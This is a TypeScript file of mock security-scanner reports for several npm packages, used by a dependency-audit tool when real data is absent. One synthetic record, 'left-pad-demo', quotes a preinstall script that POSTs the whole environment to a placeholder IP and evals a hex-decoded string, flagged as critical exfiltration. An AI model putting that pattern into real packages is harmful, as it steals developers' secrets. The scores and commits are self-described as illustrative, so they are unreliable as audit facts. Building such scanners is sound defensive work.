import type { PackageReport } from './types';

/**
 * Hand-written preview records with the exact PackageReport shape. Used only
 * when public/data/index.json has not been generated yet. Every value here is
 * illustrative, not a measurement.
 */
const noProv = { status: 'absent' as const, note: 'No npm provenance attestation was published for this version.' };

export const MOCK_REPORTS: PackageReport[] = [
  {
    name: 'chalk',
    version: '5.4.1',
    capabilities: [
      {
        id: 'env',
        detail: 'Reads terminal colour hints from the environment.',
        evidence: [{ file: 'source/vendor/supports-color/index.js', line: 21, excerpt: "if ('FORCE_COLOR' in env) {" }],
      },
    ],
    envVars: ['FORCE_COLOR', 'TERM', 'CI', 'COLORTERM', 'TERM_PROGRAM'],
    endpoints: [],
    installScripts: {},
    files: 12,
    unpackedSize: 44200,
    risk: 6,
    findings: [],
    verify: {
      provenance: {
        status: 'present',
        repo: 'github.com/chalk/chalk',
        commit: '5dbc1e2b0f6c4f0f9b3a8c1d2e7f6a5b4c3d2e1f',
        workflow: '.github/workflows/release.yml',
      },
      source: { status: 'match', repo: 'github.com/chalk/chalk', ref: 'v5.4.1', identical: 11, differs: [], builtOnly: [], onlyInPackage: [] },
    },
    score: 96,
    grade: 'A',
  },
  {
    name: 'debug',
    version: '4.4.0',
    capabilities: [
      {
        id: 'env',
        detail: 'Reads DEBUG and DEBUG_* variables to configure namespaces.',
        evidence: [{ file: 'src/node.js', line: 119, excerpt: 'return /^debug_/i.test(key);' }],
      },
    ],
    envVars: ['DEBUG', 'DEBUG_COLORS', 'DEBUG_DEPTH', 'DEBUG_SHOW_HIDDEN'],
    endpoints: [],
    installScripts: {},
    files: 7,
    unpackedSize: 42800,
    risk: 9,
    findings: [],
    verify: {
      provenance: noProv,
      source: { status: 'match', repo: 'github.com/debug-js/debug', ref: '4.4.0', identical: 6, differs: [], builtOnly: [], onlyInPackage: [] },
    },
    score: 84,
    grade: 'B',
  },
  {
    name: 'axios',
    version: '1.7.9',
    capabilities: [
      {
        id: 'network',
        detail: 'Issues HTTP(S) requests through the Node http/https adapters.',
        evidence: [{ file: 'lib/adapters/http.js', line: 228, excerpt: 'const transport = isHttpsRequest ? https : http;' }],
      },
      {
        id: 'env',
        detail: 'Honours proxy variables.',
        evidence: [{ file: 'lib/adapters/http.js', line: 185, excerpt: "let proxy = getProxyForUrl(location);" }],
      },
      {
        id: 'filesystem',
        detail: 'Reads form-data file streams when asked to.',
        evidence: [{ file: 'lib/helpers/fromDataURI.js', line: 41, excerpt: 'return new _Blob([buffer], {type: mime});' }],
      },
    ],
    envVars: ['HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY'],
    endpoints: [],
    installScripts: {},
    files: 86,
    unpackedSize: 2140000,
    risk: 22,
    findings: [],
    verify: {
      provenance: {
        status: 'present',
        repo: 'github.com/axios/axios',
        commit: 'a4b1c9f0e2d3b4a5968778695a4b3c2d1e0f9a8b',
        workflow: '.github/workflows/publish.yml',
      },
      source: {
        status: 'partial',
        repo: 'github.com/axios/axios',
        ref: 'v1.7.9',
        identical: 61,
        differs: ['lib/env/data.js'],
        builtOnly: ['dist/axios.js', 'dist/axios.min.js', 'dist/esm/axios.js', 'dist/node/axios.cjs'],
        onlyInPackage: [],
      },
    },
    score: 82,
    grade: 'B',
  },
  {
    name: 'esbuild',
    version: '0.24.2',
    capabilities: [
      {
        id: 'install_script',
        detail: 'Runs a postinstall script that selects the platform binary.',
        evidence: [{ file: 'package.json', line: 14, excerpt: '"postinstall": "node install.js"' }],
      },
      {
        id: 'child_process',
        detail: 'Spawns the native esbuild binary.',
        evidence: [{ file: 'lib/main.js', line: 2051, excerpt: 'child = child_process.spawn(command, args.concat(`--service=${"0.24.2"}`, "--ping"), {' }],
      },
      {
        id: 'native_binary',
        detail: 'Ships or downloads a prebuilt platform executable.',
        evidence: [{ file: 'install.js', line: 120, excerpt: 'const binPath = downloadedBinPath(pkg, subpath);' }],
      },
      {
        id: 'network',
        detail: 'Falls back to downloading the binary from the npm registry.',
        evidence: [{ file: 'install.js', line: 88, excerpt: 'https.get(url, (res) => {' }],
      },
      {
        id: 'filesystem',
        detail: 'Writes the binary into node_modules.',
        evidence: [{ file: 'install.js', line: 131, excerpt: 'fs.writeFileSync(binPath, extractFileFromTarGzip(buffer, subpath));' }],
      },
    ],
    envVars: ['ESBUILD_BINARY_PATH', 'npm_config_registry', 'ESBUILD_WORKER_THREADS'],
    endpoints: ['https://registry.npmjs.org/'],
    installScripts: { postinstall: 'node install.js' },
    files: 9,
    unpackedSize: 140200,
    risk: 48,
    findings: [
      {
        id: 'install-script-network',
        severity: 'medium',
        title: 'Install script can reach the network',
        detail: 'The postinstall script downloads a binary when the optional platform package is missing.',
      },
    ],
    verify: {
      provenance: {
        status: 'present',
        repo: 'github.com/evanw/esbuild',
        commit: '745abd9f0c06f73ca40fbe198546a9bc36c23b81',
        workflow: '.github/workflows/publish.yml',
      },
      source: {
        status: 'partial',
        repo: 'github.com/evanw/esbuild',
        ref: 'v0.24.2',
        identical: 2,
        differs: [],
        builtOnly: ['lib/main.js', 'lib/main.d.ts', 'install.js'],
        onlyInPackage: [],
      },
    },
    score: 63,
    grade: 'C',
  },
  {
    name: 'left-pad-demo',
    version: '9.9.9',
    capabilities: [
      {
        id: 'install_script',
        detail: 'Runs a preinstall hook.',
        evidence: [{ file: 'package.json', line: 9, excerpt: '"preinstall": "node setup.js"' }],
      },
      {
        id: 'env',
        detail: 'Enumerates the whole environment.',
        evidence: [{ file: 'setup.js', line: 3, excerpt: 'const all = JSON.stringify(process.env);' }],
      },
      {
        id: 'network',
        detail: 'Posts data to a hard-coded host.',
        evidence: [{ file: 'setup.js', line: 7, excerpt: "fetch('https://203.0.113.9/c', { method: 'POST', body: all });" }],
      },
      {
        id: 'obfuscation',
        detail: 'Contains a long hex-encoded string evaluated at runtime.',
        evidence: [{ file: 'setup.js', line: 12, excerpt: "eval(Buffer.from(p, 'hex').toString());" }],
      },
      {
        id: 'eval',
        detail: 'Evaluates a decoded string.',
        evidence: [{ file: 'setup.js', line: 12, excerpt: "eval(Buffer.from(p, 'hex').toString());" }],
      },
    ],
    envVars: ['*'],
    endpoints: ['https://203.0.113.9/c'],
    installScripts: { preinstall: 'node setup.js' },
    files: 4,
    unpackedSize: 9100,
    risk: 97,
    findings: [
      {
        id: 'exfil-env',
        severity: 'critical',
        title: 'Install script sends the environment to a remote host',
        detail: 'A preinstall hook serialises process.env and POSTs it to a raw IP address. This is the Shai-Hulud pattern.',
      },
      {
        id: 'only-in-package',
        severity: 'high',
        title: 'Published files that do not exist in the repository',
        detail: 'setup.js is in the tarball but not at the tagged commit.',
      },
    ],
    verify: {
      provenance: noProv,
      source: {
        status: 'mismatch',
        repo: 'github.com/example/left-pad-demo',
        ref: 'v9.9.9',
        identical: 2,
        differs: ['index.js'],
        builtOnly: [],
        onlyInPackage: ['setup.js'],
        note: 'Synthetic example of a hijacked release. Not a real package.',
      },
    },
    score: 4,
    grade: 'F',
  },
];
